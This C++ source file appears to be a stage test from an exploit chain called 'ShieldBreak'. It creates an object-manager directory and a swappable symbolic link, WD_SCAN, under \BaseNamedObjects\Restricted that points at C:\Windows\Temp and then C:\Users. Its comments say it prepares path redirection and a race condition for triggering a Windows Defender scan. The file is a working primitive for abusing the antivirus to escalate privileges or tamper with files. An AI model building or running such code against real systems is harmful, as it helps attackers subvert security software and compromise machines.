// Stage 2 Test: Object Manager Namespace Manipulation
// Tests if we can create directories and symlinks in \BaseNamedObjects\Restricted\
//
// This is required for the path redirection in ShieldBreak

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

// NT API declarations
extern "C" {
    NTSTATUS NTAPI NtCreateDirectoryObject(
        OUT PHANDLE DirectoryHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes
    );

    NTSTATUS NTAPI NtCreateSymbolicLinkObject(
        OUT PHANDLE LinkHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes,
        IN PUNICODE_STRING DestinationName
    );

    NTSTATUS NTAPI NtClose(IN HANDLE Handle);

    VOID NTAPI RtlInitUnicodeString(
        OUT PUNICODE_STRING DestinationString,
        IN PCWSTR SourceString
    );
}

#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

int main() {
    printf("[*] ShieldBreak Win10 Port - Stage 2 Test\n");
    printf("[*] Testing Object Manager namespace manipulation...\n\n");

    NTSTATUS status;
    HANDLE hDir = NULL;
    HANDLE hSymlink = NULL;

    // Generate unique name
    wchar_t dirName[256];
    swprintf(dirName, 256, L"\\BaseNamedObjects\\Restricted\\SHIELDBREAK_TEST_%d", GetTickCount());

    UNICODE_STRING usDirName;
    RtlInitUnicodeString(&usDirName, dirName);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usDirName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Step 1: Try to create directory in Restricted namespace
    printf("[*] Creating directory: %ws\n", dirName);

    status = NtCreateDirectoryObject(&hDir, DIRECTORY_ALL_ACCESS, &objAttr);

    if (status == 0) {
        printf("[+] Directory created successfully!\n");
    } else if (status == 0xC0000035) { // STATUS_OBJECT_NAME_COLLISION
        printf("[!] Directory already exists (OK for testing)\n");
    } else {
        printf("[-] FAILED: NtCreateDirectoryObject returned 0x%08X\n", status);

        if (status == 0xC0000022) { // STATUS_ACCESS_DENIED
            printf("[-] Access denied - check if running as standard user\n");
        } else if (status == 0xC0000034) { // STATUS_OBJECT_NAME_NOT_FOUND
            printf("[-] Parent path not found - Restricted namespace may not exist\n");
        }

        return 1;
    }

    // Step 2: Try to create symbolic link inside directory
    wchar_t linkName[256];
    swprintf(linkName, 256, L"WD_SCAN");

    UNICODE_STRING usLinkName;
    RtlInitUnicodeString(&usLinkName, linkName);

    wchar_t targetPath[] = L"\\??\\C:\\Windows\\Temp";
    UNICODE_STRING usTarget;
    RtlInitUnicodeString(&usTarget, targetPath);

    OBJECT_ATTRIBUTES linkAttr;
    InitializeObjectAttributes(&linkAttr, &usLinkName, OBJ_CASE_INSENSITIVE, hDir, NULL);

    printf("[*] Creating symlink: WD_SCAN -> %ws\n", targetPath);

    status = NtCreateSymbolicLinkObject(&hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &linkAttr, &usTarget);

    if (status == 0) {
        printf("[+] Symbolic link created successfully!\n");
    } else if (status == 0xC0000035) {
        printf("[!] Symlink already exists (OK for testing)\n");
    } else {
        printf("[-] FAILED: NtCreateSymbolicLinkObject returned 0x%08X\n", status);

        if (status == 0xC0000022) {
            printf("[-] Access denied creating symlink\n");
        }

        if (hDir) NtClose(hDir);
        return 1;
    }

    // Step 3: Verify we can swap symlinks (critical for race condition)
    printf("[*] Testing symlink deletion and recreation...\n");

    if (hSymlink) {
        NtClose(hSymlink);
        hSymlink = NULL;
    }

    // Create new symlink with different target
    wchar_t newTarget[] = L"\\??\\C:\\Users";
    RtlInitUnicodeString(&usTarget, newTarget);

    status = NtCreateSymbolicLinkObject(&hSymlink, SYMBOLIC_LINK_ALL_ACCESS, &linkAttr, &usTarget);

    if (status == 0) {
        printf("[+] Symlink swap successful!\n");
    } else if (status == 0xC0000035) {
        printf("[!] Old symlink still exists - need explicit delete\n");
        printf("[*] This is expected - ShieldBreak handles this\n");
    } else {
        printf("[-] Symlink recreation failed: 0x%08X\n", status);
    }

    // Cleanup
    if (hSymlink) NtClose(hSymlink);
    if (hDir) NtClose(hDir);

    printf("\n[+] STAGE 2 PASSED: Object Manager manipulation works!\n");
    printf("[*] Next: Test Stage 3 (Windows Defender scan trigger)\n");

    return 0;
}

// Compile with:
// cl.exe stage2_test_objmgr.cpp /Fe:stage2_test.exe /link ntdll.lib
